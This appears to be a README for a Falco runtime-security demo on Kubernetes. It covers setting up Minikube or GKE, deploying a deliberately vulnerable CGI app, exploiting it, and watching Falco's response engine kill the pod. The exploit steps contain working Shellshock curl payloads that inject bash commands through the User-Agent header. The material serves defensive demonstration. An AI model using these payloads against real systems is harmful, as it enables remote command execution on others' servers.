# falco-demo

## Setup

You should create a cluster, either with:
- A VM and Minikube
- GKE

### VM + Minikube

Spawn a VM with `vagrant up`

In the vm, start a minikube cluster:

```sh
$ sudo minikube start --vm-driver none
```

### GKE

```sh
$ gcloud container clusters create cluster-1 --zone europe-north1-a --num-nodes 1
```

Deploy the response engine:

```sh
$ kubectl apply -f /vagrant/response-engine/k8s/
```

Deploy falco:

```sh
$ cd /vagrant
$ ./deploy-falco.sh minikube
# or
$ ./deploy-falco.sh gke
```


## Full scenario

Create the cluster:

```sh
minikube start --driver virtualbox
```

In another tmux pane, launch a kubectl watch command to check on Pod statuses:

```sh
watch kubectl get pods
```

Deploy the vulnerable app:

```sh
kubectl apply -f ./vuln/vuln.yaml
```

Exploit the vulnerability:

```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo pwned | sudo tee /pwned'" http://$(minikube ip):8080/cgi-bin/stats
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /pwned'" http://$(minikube ip):8080/cgi-bin/stats
```

Remove the exploited pod:

```sh
kubectl delete pods vuln-xxxx
```

Deploy falco & wait for it to be ready:

```sh
./deploy-falco.sh
```


Try to exploit the vulnerability again:

```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo pwned | sudo tee /pwned'" http://$(minikube ip):8080/cgi-bin/stats
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /pwned'" http://$(minikube ip):8080/cgi-bin/stats
```

Watch the Pod being killed...

